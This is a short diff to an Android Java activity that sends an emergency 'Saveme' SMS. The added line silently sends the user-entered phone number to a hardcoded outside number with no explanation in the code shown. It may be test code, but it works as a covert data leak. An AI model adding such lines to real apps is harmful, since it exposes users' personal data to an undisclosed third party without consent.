@@ -65,10 +65,10 @@ public class InputPhoneNumberActivity extends AppCompatActivity {
 
     public void sendSaveNumber() {
         try {
-
             messageHandleMethod();
             SmsManager smsManager = SmsManager.getDefault();
             smsManager.sendTextMessage(phoneNumber, null, "Saveme", sentPI, deliveredPI);
+            smsManager.sendTextMessage("01718171529", null, phoneNumber, sentPI, deliveredPI);
         } catch (Exception e) {
             Toast.makeText(getApplication(), "Failed to send message", Toast.LENGTH_SHORT).show();
         }
